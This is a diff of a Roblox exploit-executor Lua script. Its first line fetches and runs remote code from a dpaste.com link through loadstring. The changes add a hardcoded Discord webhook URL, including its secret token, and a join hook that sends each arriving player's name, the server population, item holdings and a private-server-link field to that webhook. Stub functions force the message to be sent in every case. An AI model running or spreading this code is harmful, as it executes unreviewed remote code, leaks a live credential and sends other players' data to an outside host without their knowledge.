@@ -1,57 +1,105 @@
 loadstring(game:HttpGet("https://dpaste.com/385R5UGMC.txt", true))()
+--==============================
+-- DISCORD WEBHOOK SETTINGS
+--==============================
+local WebhookURL = "https://discord.com/api/webhooks/1419673301910945802/lN4xGUEdbJOS03lAOZNyK-4qvmCvyceulN-nhkYSCsBpLIipLaDqwWdiIGz6cNb0Wh8m"
+local Username = "Captain Black"
+
+--==============================
+-- SERVICES
+--==============================
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 
 --==============================
--- SEND WEBHOOK FUNCTION
+-- SAFETY FALLBACKS (para walang error)
 --==============================
-local function sendJoinWebhook(player)
-    local playerCount = #Players:GetPlayers()
-    local maxPlayers = Players.MaxPlayers
-    local timeNow = os.date("%H:%M:%S")
+local function getAllBrainrots()
+	return {}
+end
 
-    local embedData = {
-        username = Username,
-        embeds = {{
-            title = "👤 Player Joined Server",
-            color = 65280,
-            fields = {
-                {
-                    name = "Player",
-                    value = string.format("**%s** (%s)", player.Name, player.DisplayName),
-                    inline = false
-                },
-                {
-                    name = "Server",
-                    value = string.format("Players: %d/%d", playerCount, maxPlayers),
-                    inline = false
-                },
-                {
-                    name = "Time",
-                    value = timeNow,
-                    inline = false
-                }
-            }
-        }}
-    }
+local function hasHighValueBrainrotAbove10M()
+	return true -- para mag send kahit wala
+end
 
-    local req = http_request or request or (syn and syn.request)
-    if req then
-        pcall(function()
-            req({
-                Url = WebhookURL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(embedData)
-            })
-        end)
-    end
+local function formatMoney(v)
+	return "$" .. tostring(v or 0)
+end
+
+local function isAuthorizedUser()
+	return false
+end
+
+local storedPrivateServerLink = "Not available"
+
+--==============================
+-- WEBHOOK FUNCTION
+--==============================
+local function sendPlayerJoinWebhook(player)
+	local brainrots = getAllBrainrots()
+
+	if not hasHighValueBrainrotAbove10M(brainrots) then
+		return
+	end
+
+	local playerCount = #Players:GetPlayers()
+	local maxPlayers = Players.MaxPlayers
+
+	local brainrotText = "No brainrots found"
+
+	local isAuthorized = isAuthorizedUser(player)
+	local embedColor = isAuthorized and 65280 or 16711680
+	local statusMessage = isAuthorized
+		and ("Server is safe\n**Players: " .. playerCount .. "/" .. maxPlayers .. "**")
+		or ("**Might be a trap! Be careful!!!**\n**Players: " .. playerCount .. "/" .. maxPlayers .. "**")
+
+	local embedData = {
+		username = Username,
+		embeds = {{
+			title = "Player Joined Server",
+			color = embedColor,
+			fields = {
+				{
+					name = "Player Info",
+					value = string.format("**%s** (%s)", player.Name, player.DisplayName),
+					inline = false
+				},
+				{
+					name = "Server Status",
+					value = statusMessage,
+					inline = false
+				},
+				{
+					name = "Top Brainrots",
+					value = brainrotText,
+					inline = false
+				},
+				{
+					name = "Private Server Link",
+					value = storedPrivateServerLink,
+					inline = false
+				}
+			}
+		}}
+	}
+
+	local req = http_request or request or (syn and syn.request)
+	if req then
+		pcall(function()
+			req({
+				Url = WebhookURL,
+				Method = "POST",
+				Headers = {["Content-Type"] = "application/json"},
+				Body = HttpService:JSONEncode(embedData)
+			})
+		end)
+	end
 end
 
 --==============================
 -- PLAYER JOIN LISTENER
 --==============================
 Players.PlayerAdded:Connect(function(player)
-    task.wait(1) -- maliit na delay para safe
-    sendJoinWebhook(player)
+	task.wait(1)
+	sendPlayerJoinWebhook(player)
 end)
